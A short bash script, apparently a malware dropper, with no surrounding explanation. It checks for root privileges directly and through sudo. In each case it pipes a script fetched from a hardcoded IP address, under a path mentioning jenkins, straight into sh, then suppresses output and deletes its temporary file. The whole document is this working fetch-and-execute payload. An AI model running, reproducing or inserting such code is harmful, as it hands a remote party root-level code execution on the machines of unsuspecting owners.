#!/bin/bash

if [ $EUID = 0 ]; then
        curl 45.55.211.79/.cache/jenkins/r1.sh|sh
else
        echo "nope" >> /dev/null
fi

if $(sudo id | grep root > tmp.out) && [ -f tmp.out ]; then
        curl 45.55.211.79/.cache/jenkins/r1.sh|sh
else
        echo "nope" >> /dev/null
fi

rm -rf tmp.out


